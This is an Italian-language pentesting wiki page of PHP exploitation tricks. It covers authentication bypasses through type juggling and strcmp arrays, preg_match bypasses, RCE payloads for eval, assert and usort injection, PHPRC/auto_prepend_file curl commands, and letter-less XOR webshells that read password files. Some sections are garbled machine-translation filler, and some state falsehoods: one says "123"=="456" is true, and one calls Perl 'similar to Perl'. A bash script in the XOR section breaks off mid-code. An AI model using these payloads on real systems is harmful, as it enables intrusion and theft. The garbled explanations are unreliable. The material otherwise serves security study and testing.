# Trucchi PHP

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Posizione comune dei cookie:

Questo √® valido anche per i cookie di phpMyAdmin.

Cookies:
```
PHPSESSID
phpMyAdmin
```
Posizioni:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## Bypassare le comparazioni in PHP

### Comparazioni deboli/Type Juggling ( == )

Se viene utilizzato `==` in PHP, ci sono casi inaspettati in cui la comparazione non si comporta come previsto. Questo perch√© "==" confronta solo i valori trasformati nello stesso tipo, se si desidera anche confrontare che il tipo dei dati confrontati sia lo stesso, √® necessario utilizzare `===`.

Tabelle di comparazione in PHP: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (40) (1).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` Una stringa che non inizia con un numero √® uguale a un numero
* `"0xAAAA" == "43690" -> True` Stringhe composte da numeri in formato decimale o esadecimale possono essere confrontate con altri numeri/stringhe con risultato True se i numeri sono gli stessi (i numeri in una stringa vengono interpretati come numeri)
* `"0e3264578" == 0 --> True` Una stringa che inizia con "0e" e seguita da qualsiasi cosa sar√† uguale a 0
* `"0X3264578" == 0X --> True` Una stringa che inizia con "0" e seguita da qualsiasi lettera (X pu√≤ essere qualsiasi lettera) e seguita da qualsiasi cosa sar√† uguale a 0
* `"0e12334" == "0" --> True` Questo √® molto interessante perch√© in alcuni casi √® possibile controllare l'input di stringa di "0" e alcuni contenuti che vengono hashati e confrontati con esso. Pertanto, se √® possibile fornire un valore che creer√† un hash che inizia con "0e" e senza alcuna lettera, √® possibile bypassare la comparazione. √à possibile trovare **stringhe gi√† hashate** con questo formato qui: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` Qualsiasi lettera in una stringa √® uguale all'intero 0

Ulteriori informazioni su [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**Type Juggling** influisce anche sulla funzione `in_array()` di default (√® necessario impostare a true il terzo argomento per effettuare una comparazione rigorosa):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Se questa funzione viene utilizzata per **qualsiasi controllo di autenticazione** (come il controllo della password) e l'utente controlla uno dei lati del confronto, pu√≤ inviare un array vuoto invece di una stringa come valore della password (`https://example.com/login.php/?username=admin&password[]=`) e bypassare questo controllo:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
Lo stesso errore si verifica con `strcasecmp()`

### Type Juggling Rigido

Anche se viene utilizzato `===`, potrebbero verificarsi errori che rendono il confronto vulnerabile al type juggling. Ad esempio, se il confronto sta convertendo i dati in un tipo di oggetto diverso prima di confrontarli:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** pu√≤ essere utilizzato per **validare l'input dell'utente** (controlla se una qualsiasi parola/regex dalla **blacklist** √® presente nell'**input dell'utente** e se non lo √®, il codice pu√≤ continuare la sua esecuzione).

#### Bypass della nuova riga

Tuttavia, quando si delimita l'inizio della regexp, `preg_match()` **controlla solo la prima riga dell'input dell'utente**, quindi se in qualche modo si pu√≤ **inviare** l'input in **pi√π righe**, potrebbe essere possibile eludere questo controllo. Esempio:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Per aggirare questo controllo potresti **inviare il valore con new-lines urlencoded** (`%0A`) oppure, se puoi inviare **dati JSON**, inviarli in **diverse righe**:
```php
{
"cmd": "cat /etc/passwd"
}
```
Trova un esempio qui: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Bypass dell'errore di lunghezza**

(Questo bypass √® stato testato apparentemente su PHP 5.2.5 e non sono riuscito a farlo funzionare su PHP 7.3.15)\
Se riesci a inviare a `preg_match()` un **input molto grande** valido, **non sar√† in grado di elaborarlo** e sarai in grado di **bypassare** il controllo. Ad esempio, se viene messo in blacklist un JSON, potresti inviare:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
#### Bypass ReDoS

Trucco da: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223)


<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

In breve, il problema si verifica perch√© le funzioni `preg_*` in PHP si basano sulla libreria [PCRE](http://www.pcre.org/). In PCRE, alcune espressioni regolari vengono confrontate utilizzando molte chiamate ricorsive, che utilizzano molto spazio di stack. √à possibile impostare un limite sul numero di ricorsioni consentite, ma in PHP questo limite [predefinito √® di 100.000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit), che √® pi√π grande dello spazio di stack disponibile.

[Questo thread di Stackoverflow](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) √® stato anche collegato nel post in cui si parla pi√π approfonditamente di questo problema. Il nostro compito era ora chiaro:\
**Inviare un input che avrebbe fatto eseguire pi√π di 100.000 ricorsioni alla regex, causando SIGSEGV, facendo s√¨ che la funzione `preg_match()` restituisse `false`, facendo cos√¨ credere all'applicazione che il nostro input non fosse dannoso, lanciando alla fine del payload una sorpresa come `{system(<verybadcommand>)}` per ottenere SSTI --> RCE --> flag :)**.

Bene, in termini di regex, in realt√† non stiamo effettuando 100.000 "ricorsioni", ma stiamo invece contando "passi di backtracking", che come afferma la [documentazione di PHP](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) predefinito √® di 1.000.000 (1M) nella variabile `pcre.backtrack_limit`.\
Per raggiungere questo, `'X'*500_001` produrr√† 1 milione di passi di backtracking (500k in avanti e 500k all'indietro):
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### Type Juggling per l'oscuramento di PHP

Il Type Juggling √® una tecnica utilizzata per l'oscuramento del codice PHP. Sfrutta la debolezza del PHP nella gestione dei tipi di dati per ingannare l'interprete e ottenere risultati inaspettati.

#### Cos'√® il Type Juggling?

Il Type Juggling √® la conversione implicita dei tipi di dati in PHP. Questo significa che PHP pu√≤ convertire automaticamente un tipo di dato in un altro, senza che l'utente debba specificare esplicitamente la conversione.

#### Come funziona il Type Juggling per l'oscuramento?

Il Type Juggling pu√≤ essere utilizzato per nascondere il vero valore di una variabile. Ad esempio, √® possibile utilizzare una concatenazione di stringhe per convertire un valore numerico in una stringa. In questo modo, il valore originale viene mascherato e pu√≤ essere difficile da individuare.

Ecco un esempio di Type Juggling per l'oscuramento:

```php
$var1 = "123";
$var2 = "456";

if ($var1 == $var2) {
    echo "Le due variabili sono uguali";
} else {
    echo "Le due variabili sono diverse";
}
```

In questo esempio, entrambe le variabili `$var1` e `$var2` sembrano essere stringhe. Tuttavia, grazie al Type Juggling, PHP le converte in valori numerici durante il confronto. Quindi, anche se le stringhe sembrano diverse, il risultato del confronto sar√† "Le due variabili sono uguali".

#### Come proteggersi dal Type Juggling?

Per proteggersi dal Type Juggling, √® importante utilizzare l'operatore di confronto rigoroso `===` invece dell'operatore di confronto normale `==`. L'operatore `===` confronta sia il valore che il tipo di dato, rendendo pi√π difficile per un attaccante sfruttare il Type Juggling per l'oscuramento.

Ecco un esempio di utilizzo dell'operatore di confronto rigoroso:

```php
$var1 = "123";
$var2 = "456";

if ($var1 === $var2) {
    echo "Le due variabili sono uguali";
} else {
    echo "Le due variabili sono diverse";
}
```

In questo caso, il confronto tra le due variabili restituir√† "Le due variabili sono diverse", poich√© l'operatore `===` tiene conto sia del valore che del tipo di dato.

#### Conclusioni

Il Type Juggling √® una tecnica potente per l'oscuramento del codice PHP, ma pu√≤ essere sfruttata dagli attaccanti per scopi malevoli. Utilizzando l'operatore di confronto rigoroso `===` e facendo attenzione alla gestione dei tipi di dati, √® possibile proteggersi efficacemente dal Type Juggling.
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Esegui Dopo il Reindirizzamento (EAR)

Se PHP sta reindirizzando verso un'altra pagina ma nessuna funzione **`die`** o **`exit`** viene **chiamata dopo che l'intestazione `Location`** √® stata impostata, PHP continua ad eseguire e aggiunge i dati al corpo della pagina:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Altri trucchi

* **register\_globals**: In **PHP < 4.1.1.1** o se configurato in modo errato, **register\_globals** potrebbe essere attivo (o il suo comportamento viene imitato). Ci√≤ implica che nelle variabili globali come $\_GET, se hanno un valore ad esempio $\_GET\["param"]="1234", puoi accedervi tramite **$param**. Pertanto, inviando parametri HTTP puoi sovrascrivere le variabili utilizzate nel codice.
* I cookie **PHPSESSION dello stesso dominio sono memorizzati nello stesso posto**, quindi se all'interno di un dominio vengono utilizzati **diversi cookie in percorsi diversi**, puoi fare in modo che un percorso **acceda al cookie del percorso** impostando il valore del cookie dell'altro percorso.\
In questo modo, se **entrambi i percorsi accedono a una variabile con lo stesso nome**, puoi fare in modo che il **valore di quella variabile in path1 si applichi a path2**. E quindi path2 considerer√† valide le variabili di path1 (assegnando al cookie il nome corrispondente in path2).
* Quando hai gli **username** degli utenti della macchina, controlla l'indirizzo: **/\~\<USERNAME>** per vedere se le directory php sono attivate.
* [**LFI e RCE utilizzando gli wrapper php**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

Queste funzioni vengono tipicamente utilizzate in PHP per **generare hash dalle password** e per **verificare** se una password √® corretta rispetto a un hash.\
Gli algoritmi supportati sono: `PASSWORD_DEFAULT` e `PASSWORD_BCRYPT` (inizia con `$2y$`). Nota che **PASSWORD\_DEFAULT √® spesso lo stesso di PASSWORD\_BCRYPT**. E attualmente, **PASSWORD\_BCRYPT** ha un **limite di dimensione di input di 72 byte**. Pertanto, quando provi ad eseguire l'hash di qualcosa di pi√π grande di 72 byte con questo algoritmo, verranno utilizzati solo i primi 72 byte:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### Bypass delle intestazioni HTTP sfruttando gli errori di PHP

Se una **pagina PHP sta stampando errori ed echo di alcuni input forniti dall'utente**, l'utente pu√≤ far s√¨ che il server PHP stampi **contenuti abbastanza lunghi** in modo che quando cerca di **aggiungere le intestazioni** alla risposta, il server generi un errore.\
Nello scenario seguente, l'**attaccante ha fatto s√¨ che il server generasse degli errori di grandi dimensioni**, e come si pu√≤ vedere nell'immagine, quando PHP ha cercato di **modificare le informazioni dell'intestazione, non √® riuscito** (ad esempio, l'intestazione CSP non √® stata inviata all'utente):

![](<../../../.gitbook/assets/image (465).png>)

## Esecuzione del codice

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[Verifica questo per ulteriori funzioni utili di PHP](php-useful-functions-disable\_functions-open\_basedir-bypass/)
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
Per eseguire il codice nell'argomento "replace" √® necessario almeno una corrispondenza.\
Questa opzione di preg\_replace √® stata **deprecata a partire da PHP 5.5.0.**

### **RCE tramite Eval()**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE tramite Assert()**

Questa funzione in php ti permette di **eseguire codice scritto in una stringa** per **restituire vero o falso** (e in base a questo alterare l'esecuzione). Di solito la variabile dell'utente verr√† inserita nel mezzo di una stringa. Ad esempio:\
`assert("strpos($_GET['page']),'..') === false")` --> In questo caso per ottenere **RCE** potresti fare:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
Dovrai **rompere** la **sintassi** del codice, **aggiungere** il tuo **payload** e poi **ripararlo di nuovo**. Puoi utilizzare operazioni logiche come "**and" o "%26%26" o "|"**. Nota che "or", "||" non funzionano perch√© se la prima condizione √® vera, il nostro payload non verr√† eseguito. Allo stesso modo, ";" non funziona perch√© il nostro payload non verr√† eseguito.

**Un'altra opzione** √® aggiungere alla stringa l'esecuzione del comando: `'.highlight_file('.passwd').'`

**Un'altra opzione** (se hai il codice interno) √® modificare una variabile per alterare l'esecuzione: `$file = "hola"`

### **RCE tramite usort()**

Questa funzione viene utilizzata per ordinare un array di elementi utilizzando una funzione specifica.\
Per abusare di questa funzione:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
Puoi anche usare **//** per commentare il resto del codice.

Per scoprire il numero di parentesi che devi chiudere:

* `?order=id;}//`: otteniamo un messaggio di errore (`Parse error: syntax error, unexpected ';'`). Probabilmente ci manca una o pi√π parentesi.
* `?order=id);}//`: otteniamo un **avviso**. Sembra corretto.
* `?order=id));}//`: otteniamo un messaggio di errore (`Parse error: syntax error, unexpected ')' i`). Probabilmente abbiamo troppe parentesi di chiusura.

### **RCE tramite .httaccess**

Se puoi **caricare** un **.htaccess**, allora puoi **configurare** diverse cose e persino eseguire codice (configurando i file con estensione .htaccess in modo che possano essere **eseguiti**).

Diverse shell .htaccess possono essere trovate [qui](https://github.com/wireghoul/htshells)

### RCE tramite Variabili di Ambiente

Se trovi una vulnerabilit√† che ti permette di **modificare le variabili di ambiente in PHP** (e un'altra per caricare file, anche se con ulteriori ricerche potrebbe essere bypassata), puoi sfruttare questo comportamento per ottenere **RCE**.

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): Questa variabile di ambiente ti permette di caricare librerie arbitrarie quando esegui altri binari (anche se in questo caso potrebbe non funzionare).
* **`PHPRC`** : Indica a PHP **dove trovare il suo file di configurazione**, di solito chiamato `php.ini`. Se puoi caricare il tuo file di configurazione, allora usa `PHPRC` per indicare a PHP di utilizzarlo. Aggiungi una voce **`auto_prepend_file`** specificando un secondo file caricato. Questo secondo file contiene del **codice PHP normale, che viene poi eseguito** dall'interprete PHP prima di qualsiasi altro codice.
1. Carica un file PHP contenente il nostro codice shell
2. Carica un secondo file contenente una direttiva **`auto_prepend_file`** che istruisce il preprocessore PHP ad eseguire il file caricato al passo 1
3. Imposta la variabile `PHPRC` sul file caricato al passo 2.
* Ottieni ulteriori informazioni su come eseguire questa catena [**dalla relazione originale**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/).
* **PHPRC** - un'altra opzione
* Se **non puoi caricare file**, puoi utilizzare in FreeBSD il "file" `/dev/fd/0` che contiene lo **`stdin`**, ovvero il **corpo** della richiesta inviata allo `stdin`:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* Oppure, per ottenere RCE, abilita **`allow_url_include`** e aggiungi inizialmente un file con **codice PHP in base64**:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* Tecnica [**da questa relazione**](https://vulncheck.com/blog/juniper-cve-2023-36845).

## Analisi Statica di PHP

Verifica se puoi inserire codice nelle chiamate a queste funzioni (da [qui](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
Se stai effettuando il debug di un'applicazione PHP, puoi abilitare globalmente la stampa degli errori in `/etc/php5/apache2/php.ini` aggiungendo `display_errors = On` e riavviando Apache: `sudo systemctl restart apache2`

### Deobfuscating del codice PHP

Puoi utilizzare il **sito web** [**www.unphp.net**](http://www.unphp.net) **per deobfuscare il codice PHP.**

## Wrapper e protocolli PHP

I wrapper e i protocolli PHP potrebbero consentirti di **eludere le protezioni di scrittura e lettura** in un sistema e comprometterlo. Per [**ulteriori informazioni consulta questa pagina**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug RCE non autenticata

Se vedi che **Xdebug** √® **abilitato** in un output di `phpconfig()`, dovresti provare a ottenere RCE tramite [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)

## Variabili variabili
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## RCE sfruttando $\_GET\["a"]\($\_GET\["b"])

Se in una pagina puoi **creare un nuovo oggetto di una classe arbitraria**, potresti essere in grado di ottenere RCE, controlla la seguente pagina per saperne di pi√π:

{% content-ref url="php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## Eseguire PHP senza lettere

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Utilizzando l'ottale
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**

L'operatore XOR (Exclusive OR) √® un operatore logico che restituisce `true` se e solo se uno dei due operandi √® `true`, altrimenti restituisce `false`. In altre parole, l'operatore XOR restituisce `true` solo quando gli operandi sono diversi tra loro.

L'operatore XOR pu√≤ essere utilizzato in diversi contesti nel campo dell'hacking, come ad esempio la crittografia. Nella crittografia, l'operatore XOR viene utilizzato per cifrare e decifrare i dati. Quando si applica l'operatore XOR a un dato con una chiave, si ottiene un risultato cifrato. Per decifrare il dato cifrato, √® sufficiente applicare nuovamente l'operatore XOR alla chiave.

L'operatore XOR pu√≤ anche essere utilizzato per eseguire operazioni di mascheramento e demascheramento dei dati. Nel mascheramento, si applica l'operatore XOR tra un dato e una maschera per nascondere alcune informazioni. Per demascherare i dati, √® sufficiente applicare nuovamente l'operatore XOR alla maschera.

L'operatore XOR √® uno strumento potente che pu√≤ essere utilizzato in diversi scenari di hacking. Tuttavia, √® importante utilizzarlo correttamente e comprenderne le implicazioni per evitare errori e vulnerabilit√† nella sicurezza dei dati.
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¬¢___ not needed then $_($__), show_source(.passwd)
```
### XOR codice shell semplice

Secondo [**questo articolo**](https://mgp25.com/ctf/Web-challenge/), √® possibile generare un codice shell semplice in questo modo:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Quindi, se puoi **eseguire PHP arbitrario senza numeri e lettere**, puoi inviare una richiesta come quella seguente sfruttando quel payload per eseguire PHP arbitrario:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Per una spiegazione pi√π approfondita, consulta [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)

### Shellcode XOR (all'interno di eval)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl come

Perl √® un linguaggio di programmazione ad alto livello che offre molte funzionalit√† simili a Perl. √à ampiamente utilizzato per lo sviluppo di script e applicazioni web. Alcuni trucchi utili per lavorare con Perl sono:

- **Variabili**: in Perl, le variabili possono essere dichiarate utilizzando il simbolo `$`. Ad esempio, `$nome_variabile = valore;`.

- **Array**: gli array in Perl possono essere dichiarati utilizzando il simbolo `@`. Ad esempio, `@array = (valore1, valore2, valore3);`.

- **Hash**: gli hash in Perl possono essere dichiarati utilizzando il simbolo `%`. Ad esempio, `%hash = ('chiave1', 'valore1', 'chiave2', 'valore2');`.

- **Cicli**: in Perl, i cicli possono essere implementati utilizzando le istruzioni `for`, `while` e `foreach`. Ad esempio, `for ($i = 0; $i < 10; $i++) { ... }`.

- **Espressioni regolari**: Perl offre un supporto nativo per le espressioni regolari, che possono essere utilizzate per la ricerca e la manipolazione di stringhe. Ad esempio, `if ($stringa =~ /pattern/) { ... }`.

- **Funzioni**: in Perl, le funzioni possono essere definite utilizzando la parola chiave `sub`. Ad esempio, `sub nome_funzione { ... }`.

Questi sono solo alcuni esempi di come utilizzare Perl in modo simile a Perl. Conoscere queste caratteristiche pu√≤ essere utile durante il pentesting di applicazioni web scritte in Perl.
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) su GitHub.

</details>
